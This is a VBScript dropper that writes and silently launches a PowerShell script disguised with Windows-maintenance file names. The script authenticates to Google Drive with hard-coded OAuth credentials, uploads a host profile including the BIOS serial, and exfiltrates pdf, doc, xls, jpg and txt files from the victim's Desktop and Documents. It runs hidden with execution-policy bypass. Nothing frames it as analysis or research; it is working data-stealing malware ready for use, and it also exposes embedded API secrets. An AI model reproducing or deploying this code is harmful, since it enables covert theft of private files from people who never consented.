Option Explicit

Dim objFSO, objShell, objFile, objShortcut, currentScript
Dim strPSPath, strWorkerName, appDataPath, startupPath
Dim strCID, strSEC, strTOK, strBaseID

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

currentScript = WScript.ScriptFullName
strWorkerName = "win_engine_v3.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' --- GOOGLE API CONFIG ---
strCID = "530948914128-e149toq350bv8hc54lgfsv732hsisoqr.apps.googleusercontent.com"
strSEC = "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" 
strTOK = "1//0gqZ65Thvx4lQCgYIARAAGBASNwF-L9IryypMpe2NRPY9kwNw9dtwZ-7rNL5-ZQPLCRMabjJn9JRoHRrj5gm27x73Ca6GefEzg-k"
strBaseID = "root"

Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '" & strCID & "'; $SEC = '" & strSEC & "'; $TOK = '" & strTOK & "'; $BID = '" & strBaseID & "'"

' Auth Logic with Debug Print
objFile.WriteLine "Write-Host 'Connecting to Google...' -ForegroundColor Yellow"
objFile.WriteLine "try { $a = Invoke-RestMethod -Uri 'https://oauth2.googleapis.com/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'} -ErrorAction Stop"
objFile.WriteLine "  $global:h = @{Authorization=""Bearer $($a.access_token)""}"
objFile.WriteLine "  Write-Host 'AUTH SUCCESS!' -ForegroundColor Green"
objFile.WriteLine "} catch { Write-Host 'AUTH FAILED: ' $_.Exception.Message -ForegroundColor Red; exit }"

' Create Folder
objFile.WriteLine "$fName = ""Audit-$($env:COMPUTERNAME)-$(Get-Date -f 'MMdd-HHmm')"""
objFile.WriteLine "$meta = @{name=$fName;mimeType='application/vnd.google-apps.folder';parents=@($BID)} | ConvertTo-Json"
objFile.WriteLine "$SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body $meta -ContentType 'application/json').id"

' Upload Function
objFile.WriteLine "function Up($n, $p, $t) { try { $b=[System.IO.File]::ReadAllBytes($p); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null } catch {} }"

' --- ROBUST DATA GATHERING ---
objFile.WriteLine "$R = New-Object System.Text.StringBuilder"
objFile.WriteLine "[void]$R.AppendLine('=== AUDIT: ' + $env:COMPUTERNAME + ' ===')"
' Memory
objFile.WriteLine "$mem = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum"
objFile.WriteLine "[void]$R.AppendLine('RAM: ' + [math]::round($mem.Sum / 1GB, 2) + ' GB')"
' Drives
objFile.WriteLine "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | %{[void]$R.AppendLine('Disk ' + $_.DeviceID + ' Free: ' + [math]::round($_.FreeSpace/1GB, 2) + 'GB')}"
' OS/SN
objFile.WriteLine "Get-CimInstance Win32_OperatingSystem | %{[void]$R.AppendLine('OS: ' + $_.Caption)}"
objFile.WriteLine "Get-CimInstance Win32_Bios | %{[void]$R.AppendLine('SN: ' + $_.SerialNumber)}"

' Save and Upload Report
objFile.WriteLine "$rt=""$env:TEMP\Report.txt""; $R.ToString() | Out-File $rt; Up 'System_Audit.txt' $rt $SID; rm $rt"

' --- SCRAPER ---
objFile.WriteLine "$pts = @([Environment]::GetFolderPath('Desktop'), [Environment]::GetFolderPath('MyDocuments'))"
objFile.WriteLine "foreach($p in ($pts | select -Unique)){ if(Test-Path $p){ gci $p -File -Recurse -EA 0 | ?{$_.Length -lt 15MB -and $_.Extension -match 'pdf|doc|xls|jpg|txt'} | %{ Up $_.Name $_.FullName $SID } } }"

objFile.Close

' --- EXECUTION ---
' Final check: No extra parenthesis here
'objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NoExit -File """ & strPSPath & """", 1, True
' Run Hidden
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, False
